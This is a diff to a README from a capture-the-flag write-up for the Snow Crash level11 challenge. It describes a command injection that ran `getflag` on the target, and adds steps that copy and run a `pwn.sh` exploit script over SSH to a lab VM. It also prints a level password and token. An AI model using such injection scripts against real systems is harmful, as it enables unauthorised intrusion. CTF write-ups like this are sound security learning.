@@ -53,4 +53,13 @@ $ cat /tmp/l11
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 ```
 
-The server prints "Erf nope.." because our fake password obviously doesn't hash right, but it already ran our injected `getflag` on the way there. `pwn.sh` in this folder does the whole thing.
+The server prints "Erf nope.." because our fake password obviously doesn't hash right, but it already ran our injected `getflag` on the way there.
+
+`pwn.sh` in this folder bundles those two lines. It talks to the server on the target's loopback, so run it there, from the toolbox:
+
+```bash
+scp -P 4242 ~/snowcrash/level11/resources/pwn.sh level11@10.0.2.2:/tmp/
+ssh -p 4242 level11@10.0.2.2        # password: feulo4b72j7edeahuete3no7c
+# then on the target:
+$ sh /tmp/pwn.sh
+```
